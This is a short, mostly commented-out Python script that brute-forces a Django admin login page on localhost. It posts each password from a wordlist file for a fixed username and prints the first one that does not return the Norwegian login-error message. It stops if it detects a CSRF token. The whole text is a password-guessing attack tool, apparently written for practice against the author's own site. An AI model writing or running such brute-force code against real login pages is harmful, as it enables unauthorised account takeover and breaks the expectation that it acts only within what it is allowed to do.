url = "http://127.0.0.1:8000/admin/login/?next=/admin/"
# username = "davidspilde"
# error = "Vennligst oppgi gyldig brukernavn og passord til en administrasjonsbrukerkonto. Merk at det er forskjell på små og store bokstaver."
# try:
#     def bruteCracking(username,url,error):
#         for password in passwords:
#             password = password.strip()
#             print("Trying:" + password)
#             data_dict = {"username": username,"password": password,                           "login":"submit"}
#             response = requests.post(url, data=data_dict)
#             if error in str(response.content):
#                pass
#             elif "csrf" in str(response.content):
#                  print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
#                  exit()
#             else:
#                  print("Username: ---> " + username)
#                  print("Password: ---> " + password)
#                  exit()
# except:
#        print("Some Error Occurred Please Check Your Internet Connection !!")
# with open("passwords.txt", "r") as passwords:
#     bruteCracking(username,url,error)
# print("[!!] password not found in password list")
